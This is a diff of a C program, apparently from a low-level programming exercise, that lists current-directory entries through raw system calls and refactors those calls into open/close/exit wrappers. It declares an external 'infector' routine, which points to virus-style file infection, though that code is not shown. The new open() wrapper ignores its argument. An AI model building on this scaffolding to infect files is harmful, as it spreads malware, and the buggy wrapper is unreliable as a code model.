@@ -7,8 +7,8 @@
 
 /* Simplified dirent structure for getdents */
 struct linux_dirent {
-    unsigned long  d_ino;
-    unsigned long  d_off;
+    unsigned long d_ino;
+    unsigned long d_off;
     unsigned short d_reclen;
     char           d_name[1];
 };
@@ -21,6 +21,19 @@ extern void infector(char *);
 void print(char* message) {
     system_call(SYS_WRITE, STDOUT, message, strlen(message));
 }
+
+int open(char* path) {
+    return system_call(5, ".", 0, 0); 
+}
+
+void close(int file_descriptor) {
+    system_call(6, file_descriptor, 0, 0); /* sys_close */
+}
+
+void exit() {
+    system_call(1, 0x55, 0, 0);
+}
+
 
 int main(int argc, char *argv[]) {
     int fd, nread, i, bpos;
@@ -39,15 +52,16 @@ int main(int argc, char *argv[]) {
     }
     
     /* Open current directory "." */
-    fd = system_call(5, ".", 0, 0); 
+    fd = open(".");
     if (fd < 0) {
-        system_call(1, 0x55, 0, 0); /* TODO - change this to goto lblCleanup. */ 
+        exit(); /* TODO - change this to goto lblCleanup. */ 
     }
+    
     /* Get directory entries */
     nread = system_call(SYS_GETDENTS, fd, buf, BUF_SIZE);
     if (nread <= 0) {
         print("Error in getdents\n");
-        system_call(1, 0x55, 0, 0);
+        exit();
     }
     
     /* Iterate through entries */
@@ -74,6 +88,6 @@ int main(int argc, char *argv[]) {
         bpos += d->d_reclen;
     }
 
-    system_call(6, fd, 0, 0); /* sys_close */
+    close(fd);
     return 0;
 }
